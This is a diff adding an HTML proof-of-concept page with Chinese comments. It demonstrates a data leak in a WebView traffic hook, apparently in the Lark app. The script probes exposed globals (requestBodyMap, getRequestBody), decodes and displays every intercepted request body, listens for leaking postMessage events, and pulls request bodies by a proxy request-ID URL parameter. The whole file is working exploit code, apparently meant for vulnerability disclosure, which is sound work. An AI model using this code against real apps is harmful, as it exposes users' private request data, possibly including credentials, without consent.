@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head><title>POC: http_traffic_hook.js Data Leak</title></head>
+<body>
+<h1>POC: WebView Traffic Interception</h1>
+<pre id="output"></pre>
+
+<script>
+const output = document.getElementById('output');
+
+function log(msg) {
+    output.textContent += msg + '\n';
+}
+
+setTimeout(() => {
+    log('=== 检测 http_traffic_hook.js 是否存在 ===');
+    
+    // 检测 1: requestBodyMap 是否暴露
+    if (window.requestBodyMap && window.requestBodyMap instanceof Map) {
+        log('✅ requestBodyMap 已暴露!');
+        log(`   当前拦截的请求数: ${window.requestBodyMap.size}`);
+    } else {
+        log('❌ requestBodyMap 未暴露');
+    }
+    
+    // 检测 2: getRequestBody 是否暴露
+    if (typeof window.getRequestBody === 'function') {
+        log('✅ getRequestBody 已暴露!');
+    } else {
+        log('❌ getRequestBody 未暴露');
+    }
+    
+    // 检测 3: 读取所有被拦截的请求体
+    log('\n=== 读取所有被拦截的请求体 ===');
+    let count = 0;
+    for (let [reqId, base64Body] of (window.requestBodyMap || [])) {
+        count++;
+        try {
+            const decoded = atob(base64Body);
+            log(`\n[${count}] reqId: ${reqId}`);
+            log(`    Body (前200字符): ${decoded.substring(0, 200)}`);
+        } catch(e) {
+            log(`\n[${count}] reqId: ${reqId} (decode failed)`);
+        }
+    }
+    log(`\n总计拦截请求: ${count} 个`);
+    
+    // 检测 4: 监听 postMessage 泄漏
+    log('\n=== 监听 postMessage ===');
+    window.addEventListener('message', (event) => {
+        if (event.data && event.data.type === 'insertRequestBody') {
+            log(`📥 收到 postMessage 泄漏: reqId=${event.data.reqId}`);
+            log(`   Base64 Body 长度: ${event.data.base64Body.length}`);
+        }
+    });
+    
+    // 检测 5: URL 中的 lark_app_proxy_req_id
+    const urlParams = new URLSearchParams(window.location.search);
+    const proxyReqId = urlParams.get('lark_app_proxy_req_id');
+    if (proxyReqId) {
+        log(`\n=== URL 中发现追踪参数 ===`);
+        log(`   lark_app_proxy_req_id: ${proxyReqId}`);
+        
+        const body = window.getRequestBody(proxyReqId);
+        if (body) {
+            log(`   请求体: ${atob(body).substring(0, 200)}`);
+        }
+    }
+    
+}, 2000);
+</script>
+</body>
+</html>
